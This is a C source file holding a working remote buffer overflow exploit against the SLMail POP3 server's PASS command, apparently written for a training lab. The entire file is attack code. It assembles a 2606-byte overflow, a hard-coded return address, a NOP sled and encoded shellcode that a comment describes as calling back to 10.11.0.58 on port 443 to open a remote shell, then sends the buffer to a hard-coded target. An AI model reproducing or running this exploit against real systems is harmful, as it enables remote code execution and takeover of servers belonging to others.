#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
#include <unistd.h> 
#include <arpa/inet.h>

#define retadd "\x8f\x35\x4a\x5f" 
#define port 110

/* Host: 10.11.0.58; Port:443; thread safe; 351 bytes*/
char shellcode[] =
"\xd9\xc5\xbe\x30\xe1\xd6\x3d\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
"\x52\x31\x73\x17\x83\xc3\x04\x03\x43\xf2\x34\xc8\x5f\x1c\x3a"
"\x33\x9f\xdd\x5b\xbd\x7a\xec\x5b\xd9\x0f\x5f\x6c\xa9\x5d\x6c"
"\x07\xff\x75\xe7\x65\x28\x7a\x40\xc3\x0e\xb5\x51\x78\x72\xd4"
"\xd1\x83\xa7\x36\xeb\x4b\xba\x37\x2c\xb1\x37\x65\xe5\xbd\xea"
"\x99\x82\x88\x36\x12\xd8\x1d\x3f\xc7\xa9\x1c\x6e\x56\xa1\x46"
"\xb0\x59\x66\xf3\xf9\x41\x6b\x3e\xb3\xfa\x5f\xb4\x42\x2a\xae"
"\x35\xe8\x13\x1e\xc4\xf0\x54\x99\x37\x87\xac\xd9\xca\x90\x6b"
"\xa3\x10\x14\x6f\x03\xd2\x8e\x4b\xb5\x37\x48\x18\xb9\xfc\x1e"
"\x46\xde\x03\xf2\xfd\xda\x88\xf5\xd1\x6a\xca\xd1\xf5\x37\x88"
"\x78\xac\x9d\x7f\x84\xae\x7d\xdf\x20\xa5\x90\x34\x59\xe4\xfc"
"\xf9\x50\x16\xfd\x95\xe3\x65\xcf\x3a\x58\xe1\x63\xb2\x46\xf6"
"\x84\xe9\x3f\x68\x7b\x12\x40\xa1\xb8\x46\x10\xd9\x69\xe7\xfb"
"\x19\x95\x32\xab\x49\x39\xed\x0c\x39\xf9\x5d\xe5\x53\xf6\x82"
"\x15\x5c\xdc\xaa\xbc\xa7\xb7\xde\x4b\xa7\x7d\xb7\x49\xa7\x80"
"\xfc\xc7\x41\xe8\x12\x8e\xda\x85\x8b\x8b\x90\x34\x53\x06\xdd"
"\x77\xdf\xa5\x22\x39\x28\xc3\x30\xae\xd8\x9e\x6a\x79\xe6\x34"
"\x02\xe5\x75\xd3\xd2\x60\x66\x4c\x85\x25\x58\x85\x43\xd8\xc3"
"\x3f\x71\x21\x95\x78\x31\xfe\x66\x86\xb8\x73\xd2\xac\xaa\x4d"
"\xdb\xe8\x9e\x01\x8a\xa6\x48\xe4\x64\x09\x22\xbe\xdb\xc3\xa2"
"\x47\x10\xd4\xb4\x47\x7d\xa2\x58\xf9\x28\xf3\x67\x36\xbd\xf3"
"\x10\x2a\x5d\xfb\xcb\xee\x7d\x1e\xd9\x1a\x16\x87\x88\xa6\x7b"
"\x38\x67\xe4\x85\xbb\x8d\x95\x71\xa3\xe4\x90\x3e\x63\x15\xe9"
"\x2f\x06\x19\x5e\x4f\x03";
 
struct sockaddr_in plm,lar,target;
 
int conn(char *ip)
{
 int sockfd;
 plm.sin_family = AF_INET;
 plm.sin_port = htons(port);
 plm.sin_addr.s_addr = inet_addr(ip);
 bzero(&(plm.sin_zero),8);
 sockfd = socket(AF_INET,SOCK_STREAM,0);
if((connect(sockfd,(struct sockaddr *)&plm,sizeof(struct sockaddr))) < 0)
{
 perror("[-] connect error!");
 exit(0);
}
 printf("[*] Connected to: %s.\n",ip);
 return sockfd;
}
 
int main(int argc, char *argv[])
{
    int xs;
    char out[1024];
    char *buffer = malloc(2975);
    memset(buffer, 0x00, 2960);
    char *off = malloc(2606);
    memset(off, 0x00, 2606);
    memset(off, 0x41, 2606);
    char *nop = malloc(13);
    memset(nop, 0x00, 13);
    memset(nop, 0x90, 13);
    strcat(buffer, off);
    strcat(buffer, retadd);
    strcat(buffer, nop);
    strcat(buffer, shellcode);

    printf("[+] SLMAIL Remote buffer overflow exploit in POP3 PASS by Haroon Rashid Astwat.\n");
    xs = conn("10.11.10.130");
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"USER username\r\n", 15);
    read(xs, out, 1024);
    printf("[*] %s", out);
    write(xs,"PASS ",5);
    write(xs,buffer,strlen(buffer));
    printf("Shellcode len: %d bytes\n",strlen(shellcode));
    printf("Buffer len: %d bytes\n",strlen(buffer));
    write(xs,"\r\n",4);
    close(xs);  
}
